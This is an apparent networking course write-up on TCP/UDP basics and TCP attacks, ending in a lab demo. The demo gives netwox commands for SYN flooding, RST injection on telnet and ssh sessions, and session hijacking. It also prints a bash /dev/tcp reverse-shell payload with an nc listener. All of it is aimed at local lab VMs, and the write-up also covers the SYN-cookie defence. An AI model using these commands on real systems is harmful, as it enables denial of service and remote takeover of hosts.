
![logo](https://i.imgur.com/GkWR4tS.jpg)
---
# TCP Attacks

## ~Arpit

# Transport Layer

![TCP-IP-model](https://i.imgur.com/97t8sPu.jpg)

Software at the transport layer is responsible for establishing temporary communication sessions between two application programs, and delivering data as requested by those applications. 
The transport layer receives data from the application, and breaks it into chunks called segments, and sends them to the network router for delivery. Two transport layer protocols are used on the Internet.

Job of transport layer : 
1) Establishing a temporary virtual connection between the hosts
2) Converting the domain name supplied by the application to an IP address using a domain name server (for example, converting bpastudio.csudh.edu to 155.135.55.94)
3) Breaking long messages into smaller chunks and adding appropriate header information to each.
4) Checking arriving segments for errors, only acknowledging receipt if they are correct
5) Re-transmitting segments if their receipt is not acknowledged within a specified time
6) Placing incoming data in proper order and eliminating duplicate segments
7) Performing flow control

The job of transport layer is connection between two applications running in a network. Thus, this layer has a unique identity of a port number. This port number is unique in a Host. And the combination of a IP and Port number is unique to a network. 

There are 65536 port numbers, divided into 3 categories :
1) 0 - 1023 : Well known port numbers, reserved for well known applications

2) 1024 - 49151 : less well-known application, reseved for some not well known application.

3) 49152 - 65535 : Dynamic/Private port range. Generally the source port numbers are chosen randomly from this range.

![port-numbers](https://i.imgur.com/JqwL9Ro.png)

---
## UDP - protocol number 17

The user datagram protocol (UDP), is an unreliable transport protocol with no sessions or flow control and optional error checking. UDP just sends packets as soon as requested and forgets about them. It is faster than TCP, and is suitable for isochronous applications like voice over IP (VOIP) or streaming video where error correction is pointless.

### UDP Header
![UDP-Header](https://i.imgur.com/LYm9XbL.png)

### UDP Client - Server Program
![UDP Client Program](https://i.imgur.com/UKxpTL4.jpg)

![UDP Server Program](https://i.imgur.com/8L6pTJe.jpg)
---
## TCP - protocol number 6

The transmission control protocol (TCP) is used for applications in which reliable connections between hosts are necessary. TCP checks for transmission errors, lost packets, packets out of order, etc, and tries to automatically correct these without "bothering" the application program. It also does flow control, slowing transmission if it is too fast for the receiver.

### Header
![TCP-Header](https://i.imgur.com/0xbzLbZ.png)

### Connection Establisment

![3 way handshake](https://i.imgur.com/D2ecHeU.png)

### Connection Termination

![4 way handshake](https://i.imgur.com/ucDxEyA.png)

### Buffer and Data Stream

One connection has 4 buffers, 2 in each server and client. One is sender buffer and the other is receiver buffer. 

Any data that has to be sent goes from the appication and sits into the sender's buffer. The kernel then takes a responsibity to frame it into the packet and send it out. It is to be noted that as soon as the application puts the data into the buffer, it is not necessary that there will be a data sent. The kernel may wait for some more data to arrive so that it could send the data together. Doing this saves significant amount of bandwidth.  
![buffer](https://i.imgur.com/cRfmBjU.png)
![TCP stream](https://i.imgur.com/hYfpPtz.png)

TCP has a stream based buffer. That means the once the packet is received, it is merged into the already existing buffer. Thus we can cannot differentiate which byte of data is from which packet. It necessary to note that the as soon as the data arrives, the receiver application not woken up and the data is given. The kernel may wait for sometime in order to collect data as much as possible and then wake up the application. This saved the program from waking up everytime a small amount of data has arrived. 
In case of urgent data and push flag set, TCP behaves differently and sends across data without buffering and througha a seperate channel respectively.

In case of UDP, as soon as sendto() is issued, the data is send out. 

#### Urgent Pointer
If the urgent bit is set, then urgent pointer specifies the byte starting from 0 to urg-pointer, we will have the urgent data. This data will immediately transferred to the program, but the rest of the data will be put in the buffer.

### TCP Client - Server Program
![Client-program](https://i.imgur.com/2AP4r3t.jpg)

![TCP Server Program](https://i.imgur.com/P9kjCRB.jpg)
---
# Attacks

## Syn Flooding Attack

![SYN-flood](https://i.imgur.com/qS2fKPG.jpg)

### Counter Measure for Syn Flood Attack - Syn Cookie CounterMeasure.

The server behaves normally when there are not a lot of half-open connections. But as soon as it see that the maximum queue of half-open connections is going to get full, it starts the counter measure. This is the Syn Cookie Counter Measure.
The server has a secret which maybe called a nonce. As soon as the new connection arrives, the server take some parameters depending on how it is configured, and it will hash the data + nonce together, which will now act as a initial sequence number(y) for the server. Now the server need not store any minimal information about the client that is trying to connect. Once there is an ACK(y+1) from the client, the server can easily verify that this was the actual client that was trying to connect. 

## Reset Attack

We can reset an already established connection by sending a spoofed rst packet to the server or the victim directly. This will close the connection. Now, at this point only one party knows that the connection has been reset. So it is possible that the other party may keep on sending data. What happens when it send the data. ? 
The 1st party which knows that the connection has been reset will send back a reset packet to the unaware party because the receiver will think that the sender was sending data randomly without it requesting for the data.

## TCP Session Hijacking

![TCP Session Hijacking](https://i.imgur.com/JBFFxTW.jpg)

Instead of reseting the connection, the attacker tries to hijack the already established connection from the victim to the server. Thus the attacker maybe able to inject data and commands in to the session or extract sensitive or juicy information from the session. This requires crafting a packet properly with spoofed IP, sequence number, ack number, and data has to be converted in hexadecimal format.

## TCP Reverse Shell

If we are able to perform session hijacking and inject commands into the server, then we can also get a reverse shell. This means the attacker can get the bash shell of the server.

---
# Attack demo

## Lab Configurations

The lab configuration is as follows : 

Attacker - IP - 10.0.2.11

Server - IP - 10.0.2.12

Client - IP - 10.0.2.10

All of the VMs are connected to the same nat network, therefore are on the same LAN network.
Thus, enabled sniffing of any VM to any other VM.

Issue the command on the server
sudo service openbsd-inetd start
to start the telnet server.

Issue the command on the server
sudo service vsftpd start
to start the ftp server.

Issue the command on the server
sudo service ssh start
to start the ssh server.

Netwox tool has been used to craft raw packets as required.

## SYN Flood Attack

First switch off the SYN Cookie Countermeasure by 
```sysctl -w net.ipv4.tcp_syncookies=0```

Then establish the telnet connection from client to server. We can observe that we can easily access the telnet server.

```[ 10.0.2.10 ]:# telnet 10.0.2.12```

Then on the attacker VM, run
```sudo netwox 76 -i 10.0.2.12 -p 23 ```

Observation : 
On server : Use the command 
```netstat -tna ```
before and after the attack to observe the difference.

On client : Before the attack is performed, we are easily able to connect to the telnet server.
After we start the attack, and try to create a new session, then we aren't able to connect to the telnet server, thus the attack being successful.

In case, if the SYN Cookie Countermeasure is not switched off, then the attack is not successful.

## TCP RST Attacks on telnet and ssh Connections

Establish a telnet and ssh connection from client to server. 

On the attacker machine, use the command
```sudo netwox 78 -d enp0s3 -f "dst host 10.0.2.12 and dst port 23"```
to reset telnet session. And to reset ssh session, use
```sudo netwox 78 -d enp0s3 -f "dst host 10.0.2.12 and dst port 22"```

## TCP Session Hijacking

Establish a telnet connection from client to server. 

On the attacker machine, use the command
```netwox 40 --ip4-src 10.0.2.10 --ip4-dst 10.0.2.12 --tcp-src 58554 --tcp-dst 23 --tcp-seqnum 3627093980 --tcp-acknum 2862022353 --tcp-ack --tcp-psh --tcp-data "0d006d6b646972206d616c0d00"```

In the tcp-data, the command passed is '\rmkdir mal\r'
Thus, it creates a folder called 'mal' in the current working directory of the client.

Change the sequence number and acknownledgement number accordingly. The above sequence number is simply greater than the sequence number of the last packet from the client to server. And ack no is same as the ack number of the last packet from client to server.

Then as soon as the client tries to type any command after injecting the above crafted packet, the session gets hijacked and the command injected gets executed.

We can verify that the folder 'mal' has been created on the server.

## Creating Reverse Shell using TCP Session Hijacking

Establish a telnet connection from client to server. 

First run 
```nc -l 9090 -v```
on the attacker machine.

Then in the attacker machine itself, use the command

```netwox 40 --ip4-src 10.0.2.10 --ip4-dst 10.0.2.12 --tcp-src 58554 --tcp-dst 23 --tcp-seqnum 3627093980 --tcp-acknum 2862022353 --tcp-ack --tcp-psh --tcp-data "0d002f62696e2f62617368202d69203e202f6465762f7463702f31302e302e322e31312f3930393020303c263120323e26310d00"```

In the tcp-data, the command passed is ```'\r/bin/bash -i > /dev/tcp/10.0.2.11/9090 0<&1 2>&1\r'```

With this, the server spawns a shell on 10.0.2.11 (attacker), at port 9090. Our netcat catches the connection and thus brings up a shell on the attacker machine.

Make sure the sequence no is just one greater than the seqnum of the telnet client.

---
## Thank you
